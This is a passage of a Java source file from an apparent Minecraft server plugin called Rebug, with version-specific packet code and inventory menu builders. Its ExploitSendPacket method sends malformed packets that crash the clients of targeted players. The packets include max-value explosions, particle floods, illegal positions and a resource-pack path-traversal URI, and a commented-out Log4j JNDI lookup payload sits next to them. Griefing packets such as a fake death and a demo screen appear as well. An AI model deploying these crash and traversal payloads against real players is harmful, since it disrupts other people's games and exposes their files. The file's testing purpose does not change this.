package me.killstorm103.Rebug.NMS.Versions;

import java.util.ArrayList;
import java.util.Map;
import java.util.logging.Level;

import org.apache.commons.lang.StringUtils;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.Material;
import org.bukkit.craftbukkit.v1_9_R1.entity.CraftPlayer;
import org.bukkit.enchantments.Enchantment;
import org.bukkit.entity.LivingEntity;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;
import org.bukkit.inventory.InventoryHolder;
import org.bukkit.inventory.ItemFlag;
import org.bukkit.inventory.ItemStack;
import org.bukkit.inventory.meta.ItemMeta;
import org.bukkit.plugin.Plugin;
import org.bukkit.potion.Potion;
import org.bukkit.potion.PotionType;

import com.github.retrooper.packetevents.event.PacketReceiveEvent;
import com.google.common.base.Splitter;
import com.google.common.collect.Iterables;

import io.netty.buffer.ByteBuf;
import io.netty.buffer.Unpooled;
import me.killstorm103.Rebug.Commands.Menu;
import me.killstorm103.Rebug.Main.Config;
import me.killstorm103.Rebug.Main.Rebug;
import me.killstorm103.Rebug.NMS.NMS_Interface;
import me.killstorm103.Rebug.Utils.ItemsAndMenusUtils;
import me.killstorm103.Rebug.Utils.PTNormal;
import me.killstorm103.Rebug.Utils.User;
import net.md_5.bungee.api.chat.BaseComponent;
import net.md_5.bungee.api.chat.ComponentBuilder;
import net.md_5.bungee.api.chat.HoverEvent;
import net.md_5.bungee.api.chat.TextComponent;
import net.minecraft.server.v1_9_R1.BlockPosition;
import net.minecraft.server.v1_9_R1.EntityHuman;
import net.minecraft.server.v1_9_R1.EntityPlayer;
import net.minecraft.server.v1_9_R1.EnumDirection;
import net.minecraft.server.v1_9_R1.EnumParticle;
import net.minecraft.server.v1_9_R1.IChatBaseComponent;
import net.minecraft.server.v1_9_R1.IChatBaseComponent.ChatSerializer;
import net.minecraft.server.v1_9_R1.PacketDataSerializer;
import net.minecraft.server.v1_9_R1.PacketPlayOutBed;
import net.minecraft.server.v1_9_R1.PacketPlayOutChat;
import net.minecraft.server.v1_9_R1.PacketPlayOutCollect;
import net.minecraft.server.v1_9_R1.PacketPlayOutCustomPayload;
import net.minecraft.server.v1_9_R1.PacketPlayOutEntityMetadata;
import net.minecraft.server.v1_9_R1.PacketPlayOutEntityStatus;
import net.minecraft.server.v1_9_R1.PacketPlayOutExplosion;
import net.minecraft.server.v1_9_R1.PacketPlayOutGameStateChange;
import net.minecraft.server.v1_9_R1.PacketPlayOutNamedEntitySpawn;
import net.minecraft.server.v1_9_R1.PacketPlayOutPlayerInfo;
import net.minecraft.server.v1_9_R1.PacketPlayOutPosition;
import net.minecraft.server.v1_9_R1.PacketPlayOutResourcePackSend;
import net.minecraft.server.v1_9_R1.PacketPlayOutWorldParticles;
import net.minecraft.server.v1_9_R1.Vec3D;
import net.minecraft.server.v1_9_R1.World;

public class S_1_9_Interface implements NMS_Interface, InventoryHolder
{
	public static final S_1_9_Interface INSTANCE = new S_1_9_Interface();
	public void SendPacketUnBlock (Player player)
	{
		ByteBuf buf = Unpooled.buffer(256);
		buf.setByte(0, (byte)0);
		buf.writerIndex(1);
		PacketPlayOutCustomPayload p = new PacketPlayOutCustomPayload("NWS|Debugger Switch",
	    new PacketDataSerializer(buf));
		SendPacket(player, p);
	}
	
	public static int getPing (Player player) 
	{
		try {
			Object craftPlayer = player.getClass().getMethod("getHandle", new Class[0]).invoke((Object)player, new Object[0]);
			int ping = (Integer)craftPlayer.getClass().getField("ping").get(craftPlayer);
			return ping;
		}
		catch (Exception ex) 
		{
			ex.printStackTrace();
			return -1;
		}
	}
	public static CraftPlayer getCraftPlayer (Player player)
	{
		return ((CraftPlayer) player);
	}
	// Inventory Size can be: 9, 18, 27, 36, 45, 54
	
	public static EntityPlayer getEntityPlayer (Player player)
	{
		return ((CraftPlayer) player).getHandle();
	}
	public static EntityHuman getEntityHuman (Player player)
	{
		return (EntityHuman) getEntityPlayer(player);
	}
	public static EnumDirection getDirection (Player player)
	{
		return getEntityPlayer(player).bj();
	}
	public void SendPacket(Player player, Object packet) 
	{
		if (player == null || !player.isOnline() || packet == null)
			return;
			
        try 
        {
            Object handle = player.getClass().getMethod("getHandle", new Class[0]).invoke((Object) player, new Object[0]);
            Object playerConnection = handle.getClass().getField("playerConnection").get(handle);
            playerConnection.getClass().getMethod("sendPacket", PTNormal.getNMSClass("Packet")).invoke(playerConnection, packet);
        }
        catch (Exception e) 
        {
            e.printStackTrace();
        }
    }
	public void SendPacket(Player player, Object packet, int loop) 
	{
		if (player == null || !player.isOnline() || packet == null)
			return;
		
		loop = loop < 1 ? 1 : loop;
		for (int i = 0;i < loop; i ++)
			SendPacket(player, packet);
    }
	public static World getWorld(Player player) {
		return getEntityPlayer(player).getWorld();
	}
	public static Player getPlayerFromHumanEntity(LivingEntity entity) 
	{
		return (Player) entity;
	}
	@Override
 	public void ExploitSendPacket (Player attacker, Player target, String exploit, boolean CrashesPlayer)
 	{
 		if (target == null || !target.isOnline()) 
 		{
 			attacker.sendMessage("Target was null!");
 			return;
 		}
 		EntityPlayer px = getEntityPlayer(target);
 		if (px == null) 
 		{
 			attacker.sendMessage(Rebug.RebugMessage + "Failed to get EntityPlayer <" + target.getName() + ">");
 			return;
 		}
 		attacker.sendMessage(Rebug.RebugMessage + (CrashesPlayer ? "Sending Crash..." : "Sending Exploit..."));
 		if (CrashesPlayer)
 		{
 			if (exploit.equalsIgnoreCase("Server Crash")) // Test in dev
 	 		{
 	 			for (int i = 0; i < Integer.MAX_VALUE; i ++)
 	 				SendPacket(target, new PacketPlayOutCollect(target.getEntityId(), Integer.MAX_VALUE));
 	 			attacker.sendMessage(Rebug.RebugMessage + "Trying Server Crasher!");
 	 			return;
 	 		}
 	 		if (exploit.equalsIgnoreCase("Test Crash"))
 	 		{
 	 			IChatBaseComponent chatTitle = ChatSerializer.a("{\"text\":\"\"}");
 				PacketPlayOutChat chat = new PacketPlayOutChat(chatTitle, (byte) 2);
 				SendPacket(target, chat);
 	 			attacker.sendMessage(Rebug.RebugMessage + "Tried Test Crash on " + target.getName());
 	 			return;
 	 		}
 	 		if (exploit.equalsIgnoreCase("NumbWare Crash"))
 	 		{
 	 			SendPacket(target, new PacketPlayOutCustomPayload("NWS|Crash Bed",
 	 				    new PacketDataSerializer(Unpooled.buffer())));
 	 		}
 	 		if (exploit.equalsIgnoreCase("Explosion Crash"))
 	 		{
 	 			SendPacket(target, new PacketPlayOutExplosion(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ(), Float.MAX_VALUE, new ArrayList<BlockPosition>(), new Vec3D(target.getLocation().getX(), target.getLocation().getY(), target.getLocation().getZ())));
 	 		}
 	 		if (exploit.equalsIgnoreCase("Particle Crash"))
 	 		{
 	 			float red = PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), green = PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), blue = PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE);
 	 			
 	             for (int i = 0; i < EnumParticle.values().length; i ++)
 	             {
 	            	 SendPacket(target, new PacketPlayOutWorldParticles(EnumParticle.a(i), true, PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), red, green, blue, PTNormal.randomNumber(Float.MAX_VALUE, -Float.MAX_VALUE), Integer.MAX_VALUE, new int[]{0}));
 	             }
 	 		}
 	 		if (exploit.equalsIgnoreCase("GameState Crash"))
 	 		{
 	 			SendPacket(target, new PacketPlayOutGameStateChange(7, (float) (PTNormal.nextBoolean() ? PTNormal.randomNumber(Float.MAX_VALUE, 500) : PTNormal.randomNumber(-Float.MAX_VALUE, -500))));
 	 		}
 	 		if (exploit.equalsIgnoreCase("Log4j Crash"))
 	 		{
 	 			attacker.sendMessage(PTNormal.UnsupportedInVersion);
 	 			return;
 	 			//String str = "\\${jndi:ldap://192.168." + PTNormal.nextInt(1, 253) + "." + PTNormal.nextInt(1, 253) + "}";
 	 		//	ChatComponentText text = new ChatComponentText("/tell " + PTNormal.randomString(10) + " " + str);
 	 			//SendPacket(target, new PacketPlayOutChat (text., (byte) 2));
 	 		}
 	 		if (exploit.equalsIgnoreCase("illegal Position Crash"))
 	 		{
 	 			for (int i = 0; i < PacketPlayOutPosition.EnumPlayerTeleportFlags.values().length; i ++)
 	 			{
 	 				SendPacket(target, new PacketPlayOutPosition(Double.MAX_VALUE, Double.MAX_VALUE, -Double.MAX_VALUE, Float.MAX_VALUE, -Float.MAX_VALUE, PacketPlayOutPosition.EnumPlayerTeleportFlags.a(i), 1));
 	 			}
 	 		}
 	 		if (exploit.equalsIgnoreCase("illegal Effect Crash"))
 	 		{
 	 			attacker.sendMessage(PTNormal.UnsupportedInVersion);
 	 			return;
 	 		//	for (int i = 0; i < Integer.MAX_VALUE; i++)
 	 			//	SendPacket(target, new PacketPlayOutEntityEffect (target.getEntityId(), new MobEffect(Integer.MAX_VALUE, Integer.MAX_VALUE, Integer.MAX_VALUE, true, true)));
 	 			
 	 		}
 	 		if (exploit.equalsIgnoreCase("spawn creeper Crash"))
 	 		{
 	 			attacker.sendMessage(PTNormal.UnsupportedInVersion);
 	 			return;
 	 		}
 	 		if (exploit.equalsIgnoreCase("ResourcePack Crash"))
 	 		{
 	 			SendPacket(target, new PacketPlayOutResourcePackSend("a8e2cdd0a39c3737b6a6186659c2ad6b816670d2", "level://../servers.dat"));
 	 		}
 			attacker.sendMessage(Rebug.RebugMessage + "Tried using the " + exploit + " Exploit on " + target.getName());
 		}
 		else
 		{
 			if (exploit.equalsIgnoreCase("ResourcePack"))
 	 		{
 	 			target.setResourcePack("level://../servers.dat");
 	 		}
 	 		if (exploit.equalsIgnoreCase("force sleep"))
 	 		{
 	 			SendPacket(target, new PacketPlayOutBed(px, new BlockPosition(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
 	 		}
 	 		if (exploit.equalsIgnoreCase("demo"))
 	 		{
 	 			SendPacket(target, new PacketPlayOutGameStateChange(5, 0));
 	 		}
 	 		if (exploit.equalsIgnoreCase("fake death")) 
 	 		{
 	 			SendPacket(target, new PacketPlayOutEntityStatus(px, (byte) 3));
 	 		}
 	 		if (exploit.equalsIgnoreCase("Test Exploit"))
 	 		{
 	 			//TeleportUtils.GenerateCrashLocation(target);
 	 		}
 	 		if (exploit.equalsIgnoreCase("Spawn Player"))
 	 		{
 	 			target.setNoDamageTicks(Integer.MAX_VALUE);
 	 			px.setInvisible(true);
 	 			SendPacket(target, new PacketPlayOutPlayerInfo(PacketPlayOutPlayerInfo.EnumPlayerInfoAction.ADD_PLAYER, px));
 	 			SendPacket(target, new PacketPlayOutEntityMetadata(px.getId(), px.getDataWatcher(), true));
 	 			SendPacket(target, new PacketPlayOutNamedEntitySpawn(getEntityHuman(target)));
 	 		}
 			attacker.sendMessage(Rebug.RebugMessage + "Tried using the " + exploit + " Exploit on " + target.getName());
 		}
 	}
 	@Override
	public void SendChatPacket(Player player, String text, byte type) 
	{
 		IChatBaseComponent chatTitle = ChatSerializer.a(text);
		SendPacket(player, new PacketPlayOutChat(chatTitle, (byte) 2));
	}
 	@Override
	public void PlayAntiCheatSelectedSound(Player player) 
	{
		PTNormal.PlaySound(player, "block.anvil.use", 1, 1);
	}
 // Inventory Size can be: 9, 18, 27, 36, 45, 54
 	private ItemStack Reset (Material material)
 	{
 		this.item = (ItemStack) (this.itemMeta = null);
 		this.lore.clear();
 		this.item = new ItemStack(material);
 		this.itemMeta = this.item.getItemMeta();
 			
 		return this.item;
 	}
 	private ItemStack Reset (Material material, int amount)
 	{
 		this.item = (ItemStack) (this.itemMeta = null);
 		lore.clear();
 		this.item = new ItemStack(material, amount);
 		itemMeta = this.item.getItemMeta();
 			
 		return this.item;
 	}
 	@SuppressWarnings("unused")
 	private ItemStack Reset (Material material, int amount, short damage)
 	{
 		this.item = (ItemStack) (this.itemMeta = null);
 		lore.clear();
 		this.item = new ItemStack(material, amount, damage);
 		itemMeta = this.item.getItemMeta();
 			
 		return this.item;
 	}
 	@SuppressWarnings("deprecation")
 	private ItemStack Reset (Material material, Integer amount, Short damage, Byte data)
 	{
 		this.item = (ItemStack) (this.itemMeta = null);
 		lore.clear();
 		this.item = new ItemStack(material, amount, damage, data);
 		itemMeta = this.item.getItemMeta();
 			
 		return this.item;
 	}
 	public ArrayList<String> lore = new ArrayList<>();// clearing this as a test
 	private ItemMeta itemMeta = null;
 	private ItemStack item = null;
 	private ItemStack Reset (ItemStack item)
 	{
 		this.item = (ItemStack) (this.itemMeta =  null);
 		lore.clear();
 		this.item = item;
 		itemMeta = this.item.getItemMeta();
 		return this.item;
 	}
 	@Override
    public ItemStack getMadeItems (String ItemName)
    {
    	ItemStack order = null;
    	if (PTNormal.isStringNull(ItemName)) return order;
    	
    	ArrayList<String> lore = new ArrayList<>();
    	lore.clear();
    	ItemMeta itemMeta = null;
    	
    	switch (ItemName.toLowerCase())
    	{
		case "%delete_item%":
			order = Reset(Material.WOOL, 1, (short) 0, (byte) 14);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.RED + "Delete Item!");
			break;
			
		case "%debug_item%":
			order = Reset(Material.WOOL, 1, (short) 0, (byte) 1);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.RED + "Debug Item!");
			break;
			
		case "%dead_glass%":
			order = Reset(Material.STAINED_GLASS_PANE, 1, (short) 0, (byte) 7);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(" ");
			order.setItemMeta(itemMeta);
			break;

		default:
			break;
		}
    	if (order != null)
    		order.setItemMeta(itemMeta);
    	
    	return order;
    }
	@Override
	public ItemStack getMadeItems (String ItemName, User user)
	{
		ItemStack order = null;
		if (user == null || PTNormal.isStringNull(ItemName)) return order;
	    	
		ArrayList<String> lore = new ArrayList<>();
		lore.clear();
		ItemMeta itemMeta = null;
	    	
		switch (ItemName.toLowerCase())
		{
		case "%user-info%":
			order = Reset(Material.BOOK_AND_QUILL);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.DARK_PURPLE + "User " + ChatColor.GRAY + user.getName());
			lore.add("AntiCheat " + user.getColoredAntiCheat());
			lore.add("Client Brand " + ChatColor.GRAY + user.getBrand());
			lore.add("Version " + ChatColor.GRAY + PTNormal.getPlayerVersion(user.getProtocol()) + " (" + PTNormal.getPlayerVersion(user.getPlayer()) + ")");
			String world = user.getWorld().getName();
			world = world.length() > 5 ? world = PTNormal.SubString(world, 5, world.length()).replace("_", "").replace("theend", "The End") : world;
			world = world.equalsIgnoreCase("the end") ? world : world.replace(PTNormal.SubString(world, 0, 1), PTNormal.SubString(world, 0, 1).toUpperCase());
			lore.add("World " + ChatColor.GRAY + world);
			itemMeta.setLore(lore);
			break;
				
		case "%delete_item%":
			order = Reset(Material.WOOL, 1, (short) 0, (byte) 14);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.RED + "Delete Item!");
			break;
				
		case "%debug_item%":
			order = Reset(Material.WOOL, 1, (short) 0, (byte) 1);
			itemMeta = order.getItemMeta();
			itemMeta.setDisplayName(ChatColor.RED + "Debug Item!");
			break;

		default:
			break;
		}
		if (order != null)
			order.setItemMeta(itemMeta);
	    	
		return order;
	}
	@Override
	public ItemStack getMadeItems (String menuName, String itemName)
	{
		switch (menuName.toLowerCase())
		{
		case "rebug settings":
			if (itemName.equalsIgnoreCase("Per Player Alerts"))
			{
				Rebug.PrivatePerPlayerAlerts =! Rebug.PrivatePerPlayerAlerts;
				item = Reset(Material.DROPPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.PrivatePerPlayerAlerts ? ChatColor.GREEN : ChatColor.RED).toString() + "Per Player Alerts");
				item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("Debug"))
			{
				Rebug.debug =! Rebug.debug;
				item = Reset(Material.REDSTONE);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.debug ? ChatColor.GREEN : ChatColor.RED).toString()  + "Debug");
				item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("Debug To Ops Only"))
			{
				Rebug.debugOpOnly =! Rebug.debugOpOnly;
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.debugOpOnly ? ChatColor.GREEN : ChatColor.RED).toString()+ "Debug To Ops Only");
				item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("Kick on reload config"))
			{
				Rebug.KickOnReloadConfig =! Rebug.KickOnReloadConfig;
				item = Reset(Material.PAPER);
				itemMeta.setDisplayName(ChatColor.ITALIC + (Rebug.KickOnReloadConfig ? ChatColor.GREEN : ChatColor.RED).toString() + "Kick on Reload Config");
				item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("Auto Clear scaffold after place"))
			{
				Rebug.AutoRefillBlocks =! Rebug.AutoRefillBlocks;
				item = Reset(Material.RECORD_12);
				itemMeta.setDisplayName(ChatColor.ITALIC.toString() + (Rebug.AutoRefillBlocks ? ChatColor.GREEN : ChatColor.DARK_RED) + "Auto Clear scaffold after place");
				item.setItemMeta(itemMeta);
				return item;
			}
			break;

		default:
			break;
		}
		return null;
	}
	public ItemStack getMadeItems (User user, String menuName, String itemName)
	{
		switch (menuName.toLowerCase())
		{
		case "packet selector":
			if (itemName.equalsIgnoreCase("PacketPlayInFlying"))
			{
				user.FlyingPacket =! user.FlyingPacket;
				item = Reset(user.FlyingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.FlyingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInFlying");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.FlyingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInPosition"))
			{
				user.PositionPacket =! user.PositionPacket;
				item = Reset(user.PositionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.PositionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPosition");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.PositionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInPositionLook"))
			{
				user.PositionLookPacket =! user.PositionLookPacket;
				item = Reset(user.PositionLookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.PositionLookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInPositionLook");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.PositionLookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInLook"))
			{
				user.LookPacket =! user.LookPacket;
				item = Reset(user.LookPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.LookPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInLook");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.LookPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInArmAnimation"))
			{
				user.ArmAnimationPacket =! user.ArmAnimationPacket;
				item = Reset(user.ArmAnimationPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.ArmAnimationPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInArmAnimation");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.ArmAnimationPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInHeldItemSlot"))
			{
				user.HeldItemSlotPacket =! user.HeldItemSlotPacket;
				item = Reset(user.HeldItemSlotPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.HeldItemSlotPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInHeldItemSlot");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.HeldItemSlotPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInBlockDig"))
			{
				user.DiggingPacket =! user.DiggingPacket;
				item = Reset(user.DiggingPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.DiggingPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockDig");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.DiggingPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInBlockPlacement"))
			{
				user.BlockPlacePacket =! user.BlockPlacePacket;
				item = Reset(user.BlockPlacePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.BlockPlacePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInBlockPlacement");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.BlockPlacePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInEntityAction"))
			{
				user.EntityActionPacket =! user.EntityActionPacket;
				item = Reset(user.EntityActionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.EntityActionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInEntityAction");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.EntityActionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
	    		return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInCloseWindow"))
			{
				user.CloseWindowPacket =! user.CloseWindowPacket;
				item = Reset(user.CloseWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.CloseWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCloseWindow");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.CloseWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInClickWindow"))
			{
				user.ClickWindowPacket =! user.ClickWindowPacket;
				item = Reset(user.ClickWindowPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.ClickWindowPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClickWindow");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.ClickWindowPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInSettings"))
			{
				user.SettingsPacket =! user.SettingsPacket;
				item = Reset(user.SettingsPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.SettingsPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSettings");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.SettingsPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInClientStatus"))
			{
				user.StatusPacket =! user.StatusPacket;
				item = Reset(user.StatusPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.StatusPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInClientStatus");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.StatusPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInAbilities"))
			{
				user.AbilitiesPacket =! user.AbilitiesPacket;
				item = Reset(user.AbilitiesPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.AbilitiesPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInAbilities");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.AbilitiesPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInKeepAlive"))
			{
				user.KeepAlivePacket =! user.KeepAlivePacket;
				item = Reset(user.KeepAlivePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.KeepAlivePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInKeepAlive");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.KeepAlivePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInTransaction"))
			{
				user.TransactionPacket =! user.TransactionPacket;
				item = Reset(user.TransactionPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.TransactionPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInTransaction");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.TransactionPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInSpectate"))
			{
				user.SpectatePacket =! user.SpectatePacket;
				item = Reset(user.SpectatePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.SpectatePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSpectate");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.SpectatePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInSteerVehicle"))
			{
				user.SteerVehiclePacket =! user.SteerVehiclePacket;
				item = Reset(user.SteerVehiclePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.SteerVehiclePacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInSteerVehicle");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.SteerVehiclePacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInCustomPayLoad"))
			{
				user.CustomPayLoadPacket =! user.CustomPayLoadPacket;
				item = Reset(user.CustomPayLoadPacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
	    		itemMeta.setDisplayName((user.CustomPayLoadPacket ? ChatColor.GREEN : ChatColor.DARK_RED) + "PacketPlayInCustomPayLoad");
	    		lore.add(ChatColor.GRAY + "Click to " + (!user.CustomPayLoadPacket ? ChatColor.GREEN + "Enable" : ChatColor.DARK_RED + "Disable") + ChatColor.GRAY + " this packet!");
	    		itemMeta.setLore(lore);
	    		item.setItemMeta(itemMeta);
				return item;
			}
			if (itemName.equalsIgnoreCase("PacketPlayInTabComplete"))
			{
				user.TabCompletePacket =! user.TabCompletePacket;
				item = Reset(user.TabCompletePacket ? Material.EMERALD_BLOCK : Material.REDSTONE_BLOCK);
